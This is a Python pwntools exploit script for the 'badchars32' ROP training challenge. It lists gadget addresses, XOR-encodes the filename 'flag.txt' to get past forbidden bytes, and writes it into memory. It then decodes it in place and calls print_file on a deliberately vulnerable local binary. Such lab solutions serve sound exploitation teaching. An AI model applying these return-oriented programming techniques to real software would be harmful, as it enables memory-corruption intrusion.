#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template badchars32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('badchars32')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  '.'

io = start()

"""
0x0804854f: mov dword ptr [edi], esi; ret; 
0x080485b9: pop esi; pop edi; pop ebp; ret; 
0x08048547: xor byte ptr [ebp], bl; ret; 
0x080485bb: pop ebp; ret; 
0x0804839d: pop ebx; ret; 

"""

# For encoding the flag.txt we will xor it with 

def encode(flag, pwd):
	s = ""
	for i in flag:
		s += chr(ord(i) ^ pwd)

	print("Encrypted flag: ", s)
	return s


encoded = encode("flag.txt", 0x41)

print_file = p32(0x80483d0)

dss = 0x0804a018 + 0x20
pop_esi_edi_ebp = p32(0x080485b9)
www_gadget = p32(0x0804854f)
xor = p32(0x08048547)
pop_ebp = p32(0x080485bb)
pop_ebx = p32(0x0804839d)


buf = ""
buf += "\x90"*44
buf += pop_esi_edi_ebp
buf += encoded[:4]
buf += p32(dss)
buf += "BBBB"  # dummy for ebp
buf += www_gadget

buf += pop_esi_edi_ebp
buf += encoded[4:8]
buf += p32(dss + 4)
buf += "BBBB"
buf += www_gadget

#decode flag.txt
for i in range(len(encoded)):

	buf += pop_ebp
	buf += p32(dss + i)
	buf += pop_ebx
	buf += p32(0x41)
	buf += xor

# calling print_file
buf += print_file
buf += pop_ebp
buf += p32(dss)

write("in.txt", buf)

io.sendline(buf)
io.interactive()

